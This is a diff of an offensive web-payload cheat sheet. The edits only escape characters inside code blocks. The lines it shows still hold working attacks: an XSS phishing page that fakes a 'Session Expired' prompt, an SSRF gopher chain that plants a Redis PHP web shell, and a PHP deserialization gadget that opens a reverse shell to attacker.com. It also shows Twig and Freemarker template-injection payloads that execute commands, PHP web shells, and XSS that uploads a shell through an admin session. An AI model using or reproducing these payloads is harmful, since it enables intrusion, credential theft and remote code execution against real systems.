@@ -3136,7 +3136,7 @@ document.querySelectorAll('form').forEach(form => {
 \`\`\`javascript
 <script>
 // Replace page content
-document.body.innerHTML = `
+document.body.innerHTML = \`
     <div style=\"max-width: 400px; margin: 100px auto; padding: 20px; border: 1px solid #ccc;\">
         <h2>Session Expired</h2>
         <p>Please re-enter your password to continue:</p>
@@ -3145,7 +3145,7 @@ document.body.innerHTML = `
             <button type=\"submit\" style=\"width: 100%; padding: 10px; margin-top: 10px;\">Login</button>
         </form>
     </div>
-`;
+\`;
 
 document.getElementById('phish').onsubmit = function(e) {
     e.preventDefault();
@@ -3248,7 +3248,7 @@ from urllib.parse import quote
 # SSRF with gopher protocol
 commands = [
     \"FLUSHALL\",
-    \"SET 1 '<?php system($_GET[\\\"c\\\"]); ?>'\",
+    \"SET 1 '<?php system(\\\$_GET[\\\"c\\\"]); ?>'\",
     \"CONFIG SET dir /var/www/html\",
     \"CONFIG SET dbfilename shell.php\",
     \"SAVE\"
@@ -3284,16 +3284,16 @@ payload = base64.b64encode(pickle.dumps(Exploit()))
 \`\`\`php
 <?php
 class Exploit {
-    public $cmd;
-    
+    public \$cmd;
+
     function __wakeup() {
-        system($this->cmd);
+        system(\$this->cmd);
     }
 }
 
-$payload = new Exploit();
-$payload->cmd = 'bash -i >& /dev/tcp/attacker.com/4444 0>&1';
-echo serialize($payload);
+\$payload = new Exploit();
+\$payload->cmd = 'bash -i >& /dev/tcp/attacker.com/4444 0>&1';
+echo serialize(\$payload);
 // O:7:\"Exploit\":1:{s:3:\"cmd\";s:47:\"bash -i >& /dev/tcp/attacker.com/4444 0>&1\";}
 ?>
 \`\`\`
@@ -3336,7 +3336,7 @@ java -jar ysoserial.jar URLDNS 'http://attacker.com/callback' | base64
 {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}
 
 # Or
-{{_self.env.enableDebug()}}{{_self.env.setCache(\"tmp\")}}{{\"<?php system($_GET['c']);?>\" | file_put_contents(\"/tmp/shell.php\")}}
+{{_self.env.enableDebug()}}{{_self.env.setCache(\"tmp\")}}{{\"<?php system(\$_GET['c']);?>\" | file_put_contents(\"/tmp/shell.php\")}}
 \`\`\`
 
 ### Pug (Node.js)
@@ -3346,14 +3346,14 @@ java -jar ysoserial.jar URLDNS 'http://attacker.com/callback' | base64
 
 ### Freemarker (Java)
 \`\`\`java
-<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}
+<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}
 
 # Or
 <#assign classloader=object?api.class.getClassLoader()>
 <#assign owc=classloader.loadClass(\"freemarker.template.utility.ObjectWrapper\")>
 <#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>
 <#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>
-${dwf.newInstance(ec,null)(\"id\")}
+\${dwf.newInstance(ec,null)(\"id\")}
 \`\`\`
 
 ---
@@ -3362,15 +3362,15 @@ ${dwf.newInstance(ec,null)(\"id\")}
 
 ### PHP Web Shell
 \`\`\`php
-<?php system($_GET['cmd']); ?>
+<?php system(\$_GET['cmd']); ?>
 
 # Or more advanced
 <?php
-if(isset($_REQUEST['cmd'])){
-    $cmd = ($_REQUEST['cmd']);
-    system($cmd);
-    echo \"<pre>\$cmd<br>\";
-    echo shell_exec($cmd);
+if(isset(\$_REQUEST['cmd'])){
+    \$cmd = (\$_REQUEST['cmd']);
+    system(\$cmd);
+    echo \"<pre>\\\$cmd<br>\";
+    echo shell_exec(\$cmd);
     echo \"</pre>\";
     die;
 }
@@ -3443,7 +3443,7 @@ AddType application/x-httpd-php .jpg
 if (window.location.href.includes('/admin')) {
     // 3. Use admin session to upload web shell
     let formData = new FormData();
-    formData.append('file', new Blob(['<?php system($_GET[\"c\"]); ?>'], {type: 'text/plain'}), 'shell.php');
+    formData.append('file', new Blob(['<?php system(\$_GET[\"c\"]); ?>'], {type: 'text/plain'}), 'shell.php');
     
     fetch('/admin/upload', {
         method: 'POST',
